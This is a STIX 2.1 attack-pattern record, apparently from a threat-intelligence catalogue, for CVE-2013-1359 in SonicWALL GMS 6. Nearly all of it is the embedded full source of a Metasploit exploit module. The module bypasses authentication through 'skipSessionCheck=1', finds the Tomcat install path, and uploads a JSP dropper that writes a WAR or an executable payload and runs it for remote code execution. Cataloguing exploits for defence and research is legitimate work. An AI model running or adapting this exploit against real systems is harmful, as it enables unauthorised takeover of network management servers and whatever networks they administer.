{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--57ba13e0-8478-4049-bc77-834cd30a851d",
    "created": "2024-08-14T17:09:52.380766Z",
    "modified": "2024-08-14T17:09:52.38077Z",
    "name": "SonicWALL GMS 6 Arbitrary File Upload",
    "description": " This module exploits a code execution flaw in SonicWALL GMS. It exploits two vulnerabilities in order to get its objective. An authentication bypass in the Web Administration interface allows to abuse the \"appliance\" application and upload an arbitrary payload embedded in a JSP. The module has been tested successfully on SonicWALL GMS 6.0.6017 over Windows 2003 SP2 and SonicWALL GMS 6.0.6022 Virtual Appliance (Linux). On the Virtual Appliance the linux meterpreter hasn't run successfully while testing, shell payload has been used. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/sonicwall_gms_upload.rb",
            "external_id": "sonicwall_gms_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1359"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'SonicWALL GMS 6 Arbitrary File Upload',\n      'Description' => %q{\n          This module exploits a code execution flaw in SonicWALL GMS. It exploits two\n        vulnerabilities in order to get its objective. An authentication bypass in the\n        Web Administration interface allows to abuse the \"appliance\" application and upload\n        an arbitrary payload embedded in a JSP. The module has been tested successfully on\n        SonicWALL GMS 6.0.6017 over Windows 2003 SP2 and SonicWALL GMS 6.0.6022 Virtual\n        Appliance (Linux). On the Virtual Appliance the linux meterpreter hasn't run\n        successfully while testing, shell payload has been used.\n      },\n      'Author'       =>\n        [\n          'Nikolas Sotiriu', # Vulnerability Discovery\n          'Redsadic <julian.vilas[at]gmail.com>', # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-1359'],\n          [ 'OSVDB', '89347' ],\n          [ 'BID', '57445' ],\n          [ 'EDB', '24204' ]\n        ],\n      'Privileged'  => true,\n      'Platform'    => %w{ linux win },\n      'Targets'     =>\n        [\n          [ 'SonicWALL GMS 6.0 Viewpoint / Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            }\n          ],\n          [ 'SonicWALL GMS 6.0 Viewpoint / Windows 2003 SP2',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          [ 'SonicWALL GMS 6.0 Viewpoint Virtual Appliance (Linux)',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2012-01-17'))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'Path to SonicWall GMS', '/'])\n      ])\n  end\n\n\n  def install_path\n    return @install_path if @install_path\n\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path,\"appliance\",\"applianceMainPage\") + \"?skipSessionCheck=1\",\n        'method' => 'POST',\n        'connection' => 'TE, close',\n        'headers' =>\n          {\n            'TE' => \"deflate,gzip;q=0.3\",\n          },\n        'vars_post' => {\n          'num' => '123456',\n          'action' => 'show_diagnostics',\n          'task' => 'search',\n          'item' => 'application_log',\n          'criteria' => '*.*',\n          'width' => '500'\n        }\n      })\n\n    @install_path = nil\n    if res and res.code == 200 and res.body =~ /VALUE=\"(.*)logs/\n      @install_path = $1\n    end\n\n    @install_path\n  end\n\n  def upload_file(location, filename, contents)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(\"file_system\", nil, nil, \"form-data; name=\\\"action\\\"\")\n    post_data.add_part(\"uploadFile\", nil, nil, \"form-data; name=\\\"task\\\"\")\n    post_data.add_part(location, nil, nil, \"form-data; name=\\\"searchFolder\\\"\")\n    post_data.add_part(contents, \"application/octet-stream\", nil, \"form-data; name=\\\"uploadFilename\\\"; filename=\\\"#{filename}\\\"\")\n\n    data = post_data.to_s\n\n    res = send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path, \"appliance\",\"applianceMainPage\") + \"?skipSessionCheck=1\",\n        'method' => 'POST',\n        'data'   => data,\n        'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n        'headers' =>\n          {\n            'TE' => \"deflate,gzip;q=0.3\",\n          },\n        'connection' => 'TE, close'\n      })\n    register_files_for_cleanup(path_join(location, filename))\n\n    if res and res.code == 200 and res.body.empty?\n      return true\n    else\n      return false\n    end\n  end\n\n  def upload_and_run_jsp(filename, contents)\n    upload_file(path_join(install_path,\"webapps\",\"appliance\"), filename, contents)\n    send_request_cgi(\n      {\n        'uri'    => normalize_uri(target_uri.path, \"appliance\", filename),\n        'method' => 'GET'\n      })\n  end\n\n  def check\n    if install_path.nil?\n      return Exploit::CheckCode::Safe\n    end\n\n    if install_path.include?(\"\\\\\")\n      vprint_status(\"Target looks like Windows\")\n    else\n      vprint_status(\"Target looks like Linux\")\n    end\n    return Exploit::CheckCode::Vulnerable\n  end\n\n  def exploit\n    # Get Tomcat installation path\n    print_status(\"Retrieving Tomcat installation path...\")\n\n    if install_path.nil?\n      fail_with(Failure::NotVulnerable, \"#{peer} - Unable to retrieve the Tomcat installation path\")\n    end\n\n    print_good(\"Tomcat installed on #{install_path}\")\n\n    if target['Platform'] == \"java\"\n      exploit_java\n    else\n      exploit_native\n    end\n  end\n\n  def exploit_java\n    print_status(\"Uploading WAR file\")\n    app_base = rand_text_alphanumeric(4+rand(32-4))\n\n    war = payload.encoded_war({ :app_name => app_base }).to_s\n    war_filename = path_join(install_path, \"webapps\", \"#{app_base}.war\")\n\n    register_files_for_cleanup(war_filename)\n\n    dropper = jsp_drop_bin(war, war_filename)\n    dropper_filename = Rex::Text.rand_text_alpha(8) + \".jsp\"\n\n    upload_and_run_jsp(dropper_filename, dropper)\n\n    10.times do\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"Attempting to launch payload in deployed WAR...\")\n      res = send_request_cgi(\n        {\n          'uri'    => normalize_uri(target_uri.path, app_base, Rex::Text.rand_text_alpha(rand(8)+8)),\n          'method' => 'GET'\n        })\n      # Failure. The request timed out or the server went away.\n      break if res.nil?\n      # Success! Triggered the payload, should have a shell incoming\n      break if res.code == 200\n    end\n  end\n\n  def exploit_native\n    print_status(\"Uploading executable file\")\n    exe = payload.encoded_exe\n    exe_filename = path_join(install_path, Rex::Text.rand_text_alpha(8))\n    if target['Platform'] == \"win\"\n      exe << \".exe\"\n    end\n\n    register_files_for_cleanup(exe_filename)\n\n    dropper = jsp_drop_and_execute(exe, exe_filename)\n    dropper_filename = Rex::Text.rand_text_alpha(8) + \".jsp\"\n\n    upload_and_run_jsp(dropper_filename, dropper)\n  end\n\n  def path_join(*paths)\n    if install_path.include?(\"\\\\\")\n      path = paths.join(\"\\\\\")\n      path.gsub!(%r|\\\\+|, \"\\\\\\\\\\\\\\\\\")\n    else\n      path = paths.join(\"/\")\n      path.gsub!(%r|//+|, \"/\")\n    end\n\n    path\n  end\n\n  # This should probably go in a mixin\n  def jsp_drop_bin(bin_data, output_file)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|String data = \"#{Rex::Text.to_hex(bin_data, \"\")}\";\\n|\n\n    jspraw << %Q|FileOutputStream outputstream = new FileOutputStream(\"#{output_file}\");\\n|\n\n    jspraw << %Q|int numbytes = data.length();\\n|\n\n    jspraw << %Q|byte[] bytes = new byte[numbytes/2];\\n|\n    jspraw << %Q|for (int counter = 0; counter < numbytes; counter += 2)\\n|\n    jspraw << %Q|{\\n|\n    jspraw << %Q|  char char1 = (char) data.charAt(counter);\\n|\n    jspraw << %Q|  char char2 = (char) data.charAt(counter + 1);\\n|\n    jspraw << %Q|  int comb = Character.digit(char1, 16) & 0xff;\\n|\n    jspraw << %Q|  comb <<= 4;\\n|\n    jspraw << %Q|  comb += Character.digit(char2, 16) & 0xff;\\n|\n    jspraw << %Q|  bytes[counter/2] = (byte)comb;\\n|\n    jspraw << %Q|}\\n|\n\n    jspraw << %Q|outputstream.write(bytes);\\n|\n    jspraw << %Q|outputstream.close();\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def jsp_execute_command(command)\n    jspraw =  %Q|<%@ page import=\"java.io.*\" %>\\n|\n    jspraw << %Q|<%\\n|\n    jspraw << %Q|try {\\n|\n    jspraw << %Q|  Runtime.getRuntime().exec(\"chmod +x #{command}\");\\n|\n    jspraw << %Q|} catch (IOException ioe) { }\\n|\n    jspraw << %Q|Runtime.getRuntime().exec(\"#{command}\");\\n|\n    jspraw << %Q|%>\\n|\n\n    jspraw\n  end\n\n  def jsp_drop_and_execute(bin_data, output_file)\n    jsp_drop_bin(bin_data, output_file) + jsp_execute_command(output_file)\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-17",
    "x_mitre_platforms": [
        "linux"
    ]
}